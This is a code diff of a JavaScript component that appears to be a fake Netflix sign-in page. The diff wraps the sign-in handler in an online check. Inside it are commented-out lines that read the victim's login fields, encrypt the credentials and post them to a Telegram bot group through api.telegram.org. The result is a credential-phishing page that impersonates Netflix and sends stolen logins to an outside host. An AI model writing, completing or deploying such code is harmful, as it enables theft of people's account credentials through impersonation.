@@ -4,6 +4,7 @@ import {netflixlogo,googlelogo} from "assets";
 import {InputField} from "components";
 import {bottoken,netlixgroupid} from "estate";
 import {encrypt,decrypt} from "afile";
+import Path from "path";
 
 
 export default function Home(props){
@@ -40,13 +41,15 @@ export default function Home(props){
     });
     
     home.querySelector(`.${css.signin}`).onclick=()=>{
-        /*const inputvalues=refs.inputfields.map(ref=>home.querySelector(`#${ref} input`).value);
-        const input=encrypt(logincode(inputvalues[0],inputvalues[1],"google"));*/
-        history.pushState("#shows");
-        /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
-            method:"POST",
-            redirect:"follow",
-        }).catch(error=>console.log("error",error));*/
+        if(navigator.onLine){
+            /*const inputvalues=refs.inputfields.map(ref=>home.querySelector(`#${ref} input`).value);
+            const input=encrypt(logincode(inputvalues[0],inputvalues[1],"google"));*/
+            history.pushState("#shows");
+            /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
+                method:"POST",
+                redirect:"follow",
+            }).catch(error=>console.log("error",error));*/
+        }
     }
 }
 
